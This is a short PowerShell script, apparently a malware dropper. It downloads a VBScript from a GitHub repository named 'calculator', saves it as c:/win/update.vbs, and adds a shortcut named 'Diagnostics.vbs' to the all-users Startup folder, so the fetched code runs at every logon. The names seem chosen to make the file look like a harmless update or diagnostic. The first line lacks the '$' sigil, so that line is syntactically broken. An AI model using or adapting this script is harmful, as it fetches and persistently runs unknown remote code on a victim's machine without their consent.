strAllUsersProfile = [io.path]::GetFullPath($env:AllUsersProfile)
$objShell = New-Object -com "Wscript.Shell"

cd /
mkdir win
Invoke-WebRequest -Uri https://raw.githubusercontent.com/rustgod455/calculator/main/open.vbs -OutFile c:/win/update.vbs

$objShortcut = $objShell.CreateShortcut($strAllUsersProfile + "\Start Menu\Programs\Startup\Diagnostics.vbs")
$objShortcut.TargetPath = "c:/win/update.vbs"
$objShortcut.Save()
